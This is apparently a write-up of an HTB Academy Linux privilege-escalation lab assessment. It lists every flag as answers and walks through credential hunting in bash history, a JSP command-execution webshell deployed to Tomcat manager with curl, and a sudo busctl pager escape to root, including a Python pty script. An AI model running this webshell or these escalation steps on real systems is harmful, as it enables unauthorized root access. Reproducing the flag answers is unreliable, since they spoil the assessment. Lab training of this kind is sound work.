# Section 28 — Skills Assessment (ACADEMY-LLPE-SKILLS-NIX03)

> Lab: `ACADEMY-LLPE-SKILLS-NIX03` · `ssh htb-student@<T>` (`Academy_LLPE!`)

## ✅ Answers (verified live)

| Q | Answer |
|---|--------|
| Q1 — flag1.txt | **`LLPE{d0n_ov3rl00k_h1dden_f1les!}`** |
| Q2 — flag2.txt | **`LLPE{ch3ck_th0se_cmd_l1nes!}`** |
| Q3 — flag3.txt | **`LLPE{h3y_l00k_a_fl@g!}`** |
| Q4 — flag4.txt | **`LLPE{im_th3_m@nag3r_n0w}`** |
| Q5 — flag5.txt | **`LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}`** |

---

## Attack Chain Summary

```
htb-student → bash_history reveals hidden flag1
    → barry (creds in bash_history)
        → flag2 (home dir) + flag3 (/var/log, adm group)
        → reads tomcat-users.xml.bak → tomcat manager creds
            → tomcat (WAR deploy webshell)
                → flag4 (/var/lib/tomcat9/)
                → sudo -l → (root) NOPASSWD: /usr/bin/busctl
                    → busctl pager escape → root shell
                        → flag5 (/root/)
```

---

## Environment

| Detail | Value |
|--------|-------|
| OS | Ubuntu 20.04.1 LTS |
| Kernel | 5.4.0-45-generic |
| Users | htb-student, barry (adm group), mrb3n (sudo, lxd groups), tomcat |
| Services | SSH (22), HTTP/Apache (80), Tomcat (8080), MySQL (3306 localhost) |
| No gcc | PwnKit/kernel exploit compilation not possible on target |

---

## Flag 1 — Hidden File in Home Directory (htb-student)

**Technique:** Credential hunting / hidden file enumeration (§4)

```bash
# Bash history reveals the original flag location
cat ~/.bash_history
# cat /var/www/html/flag1.txt    ← flag was moved, but hint points to web content

# Check hidden files thoroughly
ls -la ~/.config/
# -rw-r--r-- 1 htb-student www-data .flag1.txt    ← hidden file with dot prefix

cat ~/.config/.flag1.txt
# LLPE{d0n_ov3rl00k_h1dden_f1les!}
```
> Always check hidden files (dot-prefixed) in home directories and subdirectories. `ls -la` shows them; `find /home -name '.*' -type f` catches nested ones.

---

## Flag 2 — Lateral Movement to Barry (Credential Reuse)

**Technique:** Credential hunting in bash history (§4)

```bash
# Barry's bash history is world-readable (-rwxr-xr-x)
cat /home/barry/.bash_history
# sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
#                ^^^^^^^^^^^^^ password exposed in plaintext

# SSH as barry
ssh barry@<T>    # password: i_l0ve_s3cur1ty!

cat ~/flag2.txt
# LLPE{ch3ck_th0se_cmd_l1nes!}
```
> Bash history commonly leaks passwords — `sshpass`, `mysql -p`, `curl -u`, `wget --password`. Always check all users' `.bash_history` files.

---

## Flag 3 — Group Membership (adm group)

**Technique:** Privileged group abuse (§10)

```bash
# Barry is in the adm group
id barry
# groups: barry, adm

# adm group can read /var/log/
cat /var/log/flag3.txt
# LLPE{h3y_l00k_a_fl@g!}
```
> The `adm` group grants read access to `/var/log/`. Check group memberships with `id` — adm, disk, docker, lxd are all high-value groups.

---

## Flag 4 — Tomcat Manager WAR Deploy

**Technique:** Vulnerable services / credential reuse (§12)

```bash
# Barry can read the tomcat backup config
cat /etc/tomcat9/tomcat-users.xml.bak
# <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui,..."/>

# Create a JSP webshell WAR
mkdir /tmp/cmd_war
cat > /tmp/cmd_war/cmd.jsp << 'JSP'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while ((line = br.readLine()) != null) out.println(line);
  br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
  while ((line = br.readLine()) != null) out.println(line);
}
%>
JSP
cd /tmp/cmd_war && zip /tmp/cmd.war cmd.jsp

# Deploy via Tomcat manager API
curl -u 'tomcatadm:T0mc@t_s3cret_p@ss!' \
  "http://<T>:8080/manager/text/deploy?path=/cmd&update=true" \
  --upload-file /tmp/cmd.war

# Read flag4 as tomcat user
curl "http://<T>:8080/cmd/cmd.jsp?cmd=cat+/var/lib/tomcat9/flag4.txt"
# LLPE{im_th3_m@nag3r_n0w}
```
> Tomcat manager with `manager-script` role allows WAR deployment via API — no GUI needed. Always check for `.bak` config files that may contain credentials.

---

## Flag 5 — Sudo busctl Pager Escape → Root

**Technique:** Sudo rights abuse / GTFOBins pager escape (§9)

```bash
# As tomcat user, check sudo rights
sudo -l
# (root) NOPASSWD: /usr/bin/busctl

# busctl uses less as pager — GTFOBins pager escape
sudo /usr/bin/busctl --show-machine
# Output goes through less pager
# Type: !/bin/sh
# → root shell

# Or use ! directly in less to run a command:
# Type: !cat /root/flag5.txt
# LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
```

**Non-interactive (from webshell via python pty):**
```bash
# If you only have a webshell (no TTY), use python to create a PTY
python3 -c "
import pty, os, time, select
master, slave = pty.openpty()
pid = os.fork()
if pid == 0:
    os.setsid()
    os.dup2(slave, 0); os.dup2(slave, 1); os.dup2(slave, 2)
    os.close(master); os.close(slave)
    os.environ['TERM'] = 'xterm'
    os.environ['LINES'] = '5'
    os.execvp('sudo', ['sudo', '/usr/bin/busctl', '--show-machine'])
else:
    os.close(slave)
    time.sleep(1)
    os.write(master, b'!cat /root/flag5.txt\n')
    time.sleep(1)
    output = b''
    while True:
        r, _, _ = select.select([master], [], [], 0.5)
        if r:
            try: output += os.read(master, 4096)
            except: break
        else: break
    os.write(master, b'q\n')
    os.close(master)
    print(output.decode('utf-8', errors='replace'))
"
```
> busctl, journalctl, systemctl, and other systemd tools use `less` as a pager. When run via sudo, the pager runs as root → `!/bin/sh` gives a root shell. This is a standard GTFOBins technique.

---

## Exam / Engagement Notes

- **Enumerate EVERYTHING at each privilege level** — this assessment is a chain where each level reveals the next step.
- **Hidden files** (dot-prefix): always use `ls -la` and check subdirectories like `.config/`, `.local/`, `.ssh/`.
- **Bash history is gold** — check all users' `.bash_history` for cleartext passwords, especially `sshpass`, `mysql -p`, `curl -u`.
- **Group memberships matter** — `adm` (logs), `docker`/`lxd` (container escape), `disk` (raw disk read), `sudo` (root).
- **Backup config files** (`.bak`, `.old`, `.save`) often contain credentials with more permissive ACLs than the original.
- **Tomcat manager** with script role = WAR deploy via curl. No GUI needed.
- **Pager escapes** work on any sudo-allowed systemd tool (busctl, journalctl, systemctl status). The pager (`less`) runs as root → `!/bin/sh` → root shell.
- **No gcc doesn't mean no root** — application-level escalation chains (creds → services → sudo misconfig) don't need compilation.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (Academy_LLPE!)
2. cat ~/.bash_history -> hint about flag location
   cat ~/.config/.flag1.txt -> LLPE{d0n_ov3rl00k_h1dden_f1les!}     ✅ Q1
3. cat /home/barry/.bash_history -> password i_l0ve_s3cur1ty!
   ssh barry@<T> -> cat ~/flag2.txt -> LLPE{ch3ck_th0se_cmd_l1nes!}  ✅ Q2
4. id -> adm group -> cat /var/log/flag3.txt -> LLPE{h3y_l00k_a_fl@g!} ✅ Q3
5. cat /etc/tomcat9/tomcat-users.xml.bak -> tomcatadm:T0mc@t_s3cret_p@ss!
   Deploy JSP webshell WAR to Tomcat manager
   curl webshell -> cat /var/lib/tomcat9/flag4.txt -> LLPE{im_th3_m@nag3r_n0w} ✅ Q4
6. sudo -l (as tomcat) -> (root) NOPASSWD: /usr/bin/busctl
   sudo /usr/bin/busctl --show-machine -> !/bin/sh or !cat /root/flag5.txt
   -> LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}                              ✅ Q5
```

> One line: hidden files → bash history creds → lateral to barry → adm group logs → tomcat .bak creds → WAR deploy → sudo busctl pager escape → root.
